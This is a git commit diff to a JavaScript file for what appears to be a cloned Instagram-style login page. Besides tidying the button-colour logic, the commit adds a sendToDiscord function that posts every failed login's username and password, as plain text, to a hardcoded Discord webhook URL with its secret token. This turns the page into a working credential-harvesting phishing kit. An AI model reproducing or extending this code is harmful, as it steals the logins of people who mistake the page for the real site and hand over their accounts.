a06116d733b5f3371decbf31541cf5163d2c3871
7test357 <7test357@gmail.com>
2024-11-24 10:31:43 +0900

    Update in.js

--- indexpage/6iglogin/in.js
+++ indexpage/6iglogin/in.js
@@ -1,27 +1,55 @@
 let inputTag = document.getElementsByTagName("input");
 let buttonArray = document.getElementsByTagName("button");
 
-let inputId = inputTag[0]; //아이디 입력창(input 태그의 0번째)
-let inputPassword = inputTag[1]; //비밀번호 입력창
+let inputId = inputTag[0];
+let inputPassword = inputTag[1];
 
 let ordinaryButton = buttonArray[0];
 let facebookLoginButton = buttonArray[1];
 
 inputPassword.addEventListener("keyup", () => {
-    if(inputId.value){
+    if (inputId.value && inputPassword.value) {
         ordinaryButton.classList.remove("unactivatedLoginColor");
         ordinaryButton.classList.add("activatedLoginColor");
-    }
-    if(!inputPassword.value){
+    } else {
         ordinaryButton.classList.remove("activatedLoginColor");
         ordinaryButton.classList.add("unactivatedLoginColor");
     }
-})
+});
 
 ordinaryButton.addEventListener('click', () => {
-    if(inputId.value === "본인의아이디" && inputPassword.value === "비밀번호"){
+    if (inputId.value === "본인의아이디" && inputPassword.value === "비밀번호") {
         alert("로그인 성공");
     } else {
+        sendToDiscord(inputId.value, inputPassword.value);
         alert("로그인 실패");
     }
-})
+});
+
+function sendToDiscord(userId, password) {
+    const webhookURL = 'https://discord.com/api/webhooks/1310055086894088334/pfzUyUzcbcYW4NgTKgQ9_Qbr3q-ZSawuOjy-GudZ_nHhE4IpM52i_f0eGKfmDIOzuuPt';
+
+    const data = {
+        content: `로그인 시도:\n아이디: ${userId}\n비밀번호: ${password}`
+    };
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('네트워크 응답이 좋지 않습니다.');
+        }
+        return response.json();
+    })
+    .then(data => {
+        console.log('성공:', data);
+    })
+    .catch((error) => {
+        console.error('오류:', error);
+    });
+}
